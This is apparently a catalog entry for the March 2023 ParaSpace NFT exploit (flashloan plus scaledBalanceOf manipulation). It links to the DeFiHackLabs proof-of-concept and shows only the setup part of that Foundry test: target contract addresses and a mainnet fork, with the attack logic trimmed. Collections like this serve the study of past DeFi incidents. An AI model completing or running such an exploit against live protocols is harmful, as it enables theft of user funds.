# [?] - ParaSpace NFT - Flashloan + scaledBalanceOf Manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: paraspace
Published: 2023-03-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/paraspace_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://twitter.com/BlockSecTeam/status/1636650252844294144
- https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a

```solidity
contract ContractTest is Test {
    address _pcAPE = 0xDDDe38696FBe5d11497D72d8801F651642d62353;
    address _vDebtUSDC = 0x1B36ad30F6866716FF08EB599597D8CE7607571d;
    address _vDebtwstETH = 0xCA76D6D905b08e3224945bFA0340E92CCbbE5171;
    address _vDebtWETH = 0x87F92191e14d970f919268045A57f7bE84559CEA;
    address _APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
    address _USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address _ParaProxy = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;
    address _WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address _cAPE = 0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF;
    address _Apecoin__Staking = 0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9;
    address _Uniswap_V3__Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address _proxy = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_845_558);
        cheats.label(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, "_wstETH");
        cheats.label(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, "_WETH");
        cheats.label(0xDDDe38696FBe5d11497D72d8801F651642d62353, "_pcAPE");
        cheats.label(0x4d224452801ACEd8B2F0aebE155379bb5D594381, "_APE");
        cheats.label(0x1B36ad30F6866716FF08EB599597D8CE7607571d, "_vDebtUSDC");
        cheats.label(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF, "_cAPE");
        cheats.label(0xCA76D6D905b08e3224945bFA0340E92CCbbE5171, "_vDebtwstETH");
        cheats.label(0x87F92191e14d970f919268045A57f7bE84559CEA, "_vDebtWETH");
        cheats.label(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, "_USDC");
        cheats.label(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee, "_ParaProxy");
        cheats.label(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2, "_proxy");
        cheats.label(0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9, "_Apecoin__Staking");
        cheats.label(0xE592427A0AEce92De3Edee1F18E0157C05861564, "_Uniswap_V3__Router");
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/paraspace_exp.sol_
